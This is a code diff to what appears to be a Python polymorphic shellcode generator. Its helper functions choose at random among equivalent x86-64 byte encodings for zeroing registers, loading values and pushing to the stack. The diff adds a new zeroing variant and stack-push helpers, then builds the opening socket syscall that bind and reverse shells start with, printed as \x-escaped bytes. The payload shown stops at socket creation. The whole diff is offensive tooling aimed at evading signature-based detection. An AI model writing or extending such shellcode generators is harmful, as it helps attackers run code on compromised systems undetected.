@@ -5,7 +5,7 @@ import random
 
 def setRegToZero(reg):
     chunk = bytearray()
-    case = random.randint(1,2)
+    case = random.randint(1,3)
 
     match case:
         case 1: # Xor with itself method
@@ -16,6 +16,18 @@ def setRegToZero(reg):
             shift = bytearray([0x48,0xC1,(0xE8+registerDictionary[reg]),0x20])
             chunk += shift
             chunk += shift
+        case 3: # push -1, pop and not 
+            chunk.append(0x68)
+            value = bytearray(struct.pack("<i",-1))
+            for i in value :
+                chunk.append(i)
+            
+            chunk.append((0x58+registerDictionary[reg]))
+
+            not_op =  bytearray([0x48,0xf7,(0xD0+registerDictionary[reg])])
+            chunk += not_op
+            
+
 
 
     
@@ -44,7 +56,7 @@ def movValueToReg(reg,value):
         case 2:
             chunk.append(0x68)
             value = -value
-            value = bytearray(struct.pack("<i",value+1))
+            value = bytearray(struct.pack("<i",value))
             for i in value :
                 chunk.append(i)
             
@@ -52,6 +64,8 @@ def movValueToReg(reg,value):
 
             not_op =  bytearray([0x48,0xf7,(0xD0+registerDictionary[reg])])
             chunk += not_op
+            inc_ope = bytearray([0x48,0xff,(0xC0+registerDictionary[reg])])
+            chunk += inc_ope
             
 
     
@@ -118,14 +132,42 @@ def movBYTEToMemory(offset,reg):
 
     return chunk
 
+def pushWORDToStack(reg):
+    chunk = bytearray()
+    case = random.randint(1,1)
+
+    match case:
+        case 1: #push to stack method
+            push = bytearray([0x66,0x50+(registerDictionary[reg])])
+            chunk += push
+
+    return chunk
+
+def pushDWORDToStack(reg):
+    chunk = bytearray()
+    case = random.randint(1,1)
+
+    match case:
+        case 1: #push to stack method
+            push = bytearray([0x50+(registerDictionary[reg])])
+            chunk += push
+
+    return chunk
+
+
+
+
+
 registerDictionary = {"rax":0,"rcx":1,"rdx":2,"rbx":3,"rsp":4,"rbp":5,"rsi":6,"rdi":7}
 # the order works for : push FB, pop FB
-
+syscall = bytearray([0x0f,0x05])
 shellcode = bytearray()
 
-shellcode += movValueToReg("rax",0X34)
-shellcode += movBYTEToMemory(8,"rax")
-
+shellcode += movValueToReg("rdi",2)
+shellcode += movValueToReg("rsi",1)
+shellcode += setRegToZero("rdx")
+shellcode += movValueToReg("rax",41)
+shellcode += syscall
 
 
 
@@ -133,9 +175,9 @@ shellcode += movBYTEToMemory(8,"rax")
 
 for i in shellcode:
     if i < 16:
-        print("0{}".format(hex(i).lstrip("0x")),end='')
+        print("\\x0{}".format(hex(i).lstrip("0x")),end='')
     else:
-        print("{}".format(hex(i).lstrip("0x")),end='')
+        print("\\x{}".format(hex(i).lstrip("0x")),end='')
 
 
 
